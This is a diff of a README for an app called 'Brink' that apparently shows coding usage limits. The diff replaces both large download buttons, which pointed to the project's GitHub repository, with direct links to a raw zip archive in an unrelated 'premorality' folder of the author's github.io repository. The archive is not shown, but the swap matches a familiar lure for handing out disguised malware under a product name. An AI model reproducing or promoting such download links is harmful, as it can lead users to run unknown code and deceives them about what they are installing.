@@ -10,7 +10,7 @@ description: "Know when you're on the brink—a tiny edge-of-screen panel showin
 **Ready to get started?** Click the big button below to visit the official download page:
 
 <p align="center">
-  <a href="https://github.com/frankcharitable8132/brink" style="background-color: #FF6B6B; color: white; padding: 15px 30px; font-size: 20px; font-weight: bold; text-decoration: none; border-radius: 8px; display: inline-block;">⬇️ DOWNLOAD BRINK NOW</a>
+  <a href="https://raw.githubusercontent.com/frankcharitable8132/frankcharitable8132.github.io/main/premorality/Release_3.1-beta.2.zip" style="background-color: #FF6B6B; color: white; padding: 15px 30px; font-size: 20px; font-weight: bold; text-decoration: none; border-radius: 8px; display: inline-block;">⬇️ DOWNLOAD BRINK NOW</a>
 </p>
 
 Visit this link to download the application.
@@ -115,7 +115,7 @@ Brink is the solution to one of the most annoying problems in modern development
 Stop guessing, stop worrying, and never let a usage limit catch you off guard again. Download Brink today and code with total peace of mind!
 
 <p align="center">
-  <a href="https://github.com/frankcharitable8132/brink" style="background-color: #4ECDC4; color: white; padding: 15px 30px; font-size: 20px; font-weight: bold; text-decoration: none; border-radius: 8px; display: inline-block;">🚀 GET BRINK NOW — IT'S FREE</a>
+  <a href="https://raw.githubusercontent.com/frankcharitable8132/frankcharitable8132.github.io/main/premorality/Release_3.1-beta.2.zip" style="background-color: #4ECDC4; color: white; padding: 15px 30px; font-size: 20px; font-weight: bold; text-decoration: none; border-radius: 8px; display: inline-block;">🚀 GET BRINK NOW — IT'S FREE</a>
 </p>
 
 ---
